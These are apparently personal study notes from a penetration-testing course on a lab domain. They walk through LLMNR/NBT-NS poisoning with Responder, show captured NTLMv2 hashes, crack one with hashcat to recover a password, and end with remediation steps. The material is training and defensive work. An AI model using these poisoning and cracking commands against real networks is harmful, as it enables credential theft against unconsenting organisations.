#LLMNR #Responder #NTLM
- Link Local Multi-cast Name Resolution
- Used to identify hosts when DNS fails
- Previously NBT-NS
- Services utilize a user's username and NTLM hash
- If using CyberArk (PAM), cracking hashes probably not going to happen, try another attack (maybe SMB Replay)
Step 1: Run Responder
	`sudo responder -i tun0 -dwPv`
	- may need to use `eth0` depending on internal network
	- cant fun `-w` at same time as `-P`... use either, both work to capture hashes...
		 `-dwv`
		`-dPv`
Step 2: An Event Occurs
	cause an event by pointing to a fileshare on user account
Step 3: Get Dem Hashes
	Caught in attacker terminal when running responder
Step 4: Crack Dem Hashes
	`hashcat -m 5600 hashes.txt rockyou.txt`


Navigating to my attacker IP from Domain User
![[Pasted image 20240626110321.png]]

Captures hashes of fcastle

```
┌──(root㉿kali)-[/home/kali]
└─# sudo responder -I eth0 -dwv 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.95.130]
    Responder IPv6             [fe80::f8cf:e62a:6360:36c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-2M888OAOH0B]
    Responder Domain Name      [39QN.LOCAL]
    Responder DCE-RPC Port     [49839]

[+] Listening for events...                                                                                                                                 

[*] [NBT-NS] Poisoned answer sent to 192.168.95.133 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.95.133 for name MARVEL (service: Browser Election)
[SMB] NTLMv2-SSP Client   : 192.168.95.133
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:626dd215085ef046:709F47404243CBFAD003BC4BFA1DCA31:0101000000000000009EB5FAB7C7DA0136B097F4B50295EC00000000020008003300390051004E0001001E00570049004E002D0032004D003800380038004F0041004F0048003000420004003400570049004E002D0032004D003800380038004F0041004F004800300042002E003300390051004E002E004C004F00430041004C00030014003300390051004E002E004C004F00430041004C00050014003300390051004E002E004C004F00430041004C0007000800009EB5FAB7C7DA0106000400020000000800300030000000000000000100000000200000C4F03B35F30729C2BEFA2D70E73245A36DAFDA88EE5A14F0E5FF9874A536FE790A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390035002E003100330030000000000000000000                                              
[SMB] NTLMv2-SSP Client   : 192.168.95.133
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:8447c2723b99cd7b:DE5D31EA9E495B46E5532D637CAEEB6C:0101000000000000009EB5FAB7C7DA0182EB99C3BC045E4700000000020008003300390051004E0001001E00570049004E002D0032004D003800380038004F0041004F0048003000420004003400570049004E002D0032004D003800380038004F0041004F004800300042002E003300390051004E002E004C004F00430041004C00030014003300390051004E002E004C004F00430041004C00050014003300390051004E002E004C004F00430041004C0007000800009EB5FAB7C7DA0106000400020000000800300030000000000000000100000000200000C4F03B35F30729C2BEFA2D70E73245A36DAFDA88EE5A14F0E5FF9874A536FE790A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390035002E003100330030000000000000000000                                              
[SMB] NTLMv2-SSP Client   : 192.168.95.133
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:726e5fde5918c85a:9FEFAD070E4AD7E6F659F781818897EF:0101000000000000009EB5FAB7C7DA01122A543A7015AAA600000000020008003300390051004E0001001E00570049004E002D0032004D003800380038004F0041004F0048003000420004003400570049004E002D0032004D003800380038004F0041004F004800300042002E003300390051004E002E004C004F00430041004C00030014003300390051004E002E004C004F00430041004C00050014003300390051004E002E004C004F00430041004C0007000800009EB5FAB7C7DA0106000400020000000800300030000000000000000100000000200000C4F03B35F30729C2BEFA2D70E73245A36DAFDA88EE5A14F0E5FF9874A536FE790A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390035002E003100330030000000000000000000                                              
[SMB] NTLMv2-SSP Client   : 192.168.95.133
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:3b1c7fada0937ffd:76B681E763916760D509CE23AAE8142A:0101000000000000009EB5FAB7C7DA01A922A344D84C5ECA00000000020008003300390051004E0001001E00570049004E002D0032004D003800380038004F0041004F0048003000420004003400570049004E002D0032004D003800380038004F0041004F004800300042002E003300390051004E002E004C004F00430041004C00030014003300390051004E002E004C004F00430041004C00050014003300390051004E002E004C004F00430041004C0007000800009EB5FAB7C7DA0106000400020000000800300030000000000000000100000000200000C4F03B35F30729C2BEFA2D70E73245A36DAFDA88EE5A14F0E5FF9874A536FE790A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390035002E003100330030000000000000000000     
```

# Cracking Our Hashes
- Copy hash to a file `hashes.txt`
- hashcat vs.  johntheripper
- cracking on VMs are slower bc it uses CPU and not the base metal GPU
```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(11:08:48)──> hashcat --help | grep NTLM                                                                                              1 ↵ ──(Wed,Jun26)─┘
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
* 5600
* https://hashcat.net/wiki/doku.php?id=example_hashes
* make sure no spaces at end of hash in hashfile
```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(11:16:26)──> hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt                                                                 ──(Wed,Jun26)─┘
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 6939/13943 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

FCASTLE::MARVEL:3b1c7fada0937ffd:76b681e763916760d509ce23aae8142a:0101000000000000009eb5fab7c7da01a922a344d84c5eca00000000020008003300390051004e0001001e00570049004e002d0032004d003800380038004f0041004f0048003000420004003400570049004e002d0032004d003800380038004f0041004f004800300042002e003300390051004e002e004c004f00430041004c00030014003300390051004e002e004c004f00430041004c00050014003300390051004e002e004c004f00430041004c0007000800009eb5fab7c7da0106000400020000000800300030000000000000000100000000200000c4f03b35f30729c2befa2d70e73245a36dafda88ee5a14f0e5ff9874a536fe790a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00390035002e003100330030000000000000000000:Password1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: FCASTLE::MARVEL:3b1c7fada0937ffd:76b681e763916760d5...000000
Time.Started.....: Wed Jun 26 11:16:42 2024 (0 secs)
Time.Estimated...: Wed Jun 26 11:16:42 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    91031 H/s (2.90ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Util: 25%

Started: Wed Jun 26 11:16:27 2024
Stopped: Wed Jun 26 11:16:44 2024
```

~CRACKED~!
* add `--show` to show cracked hashes and passwords
* `--force` forces VM to run hashcat
* **rockyou2021 password list is trillion passwords, 91GB!**
* One Rule to rule them all
	* `-r OneRule`
	* Mutates password list, use with rockyou/rockyou2021

# LLMNR Poisoning Defenses (how to remediate)
* The best defense is to disable LLMNR and NBT-NS
	* **LLMNR**: (In Group Policy Management from Windows Server/DC) "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Poilcy Editor
		* can still be bypassed by good start
	* **NBT-NS**: navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP"
		* not un-hackable but makes it much more difficult to crack
* If a company must user or cannot disable LLMNR/NBT-NS, the best course of action is to:
	* Require Network Access Control
	* Require strong user passwords (>14 charcters, limit common word usage). More complex and long passwords are best.
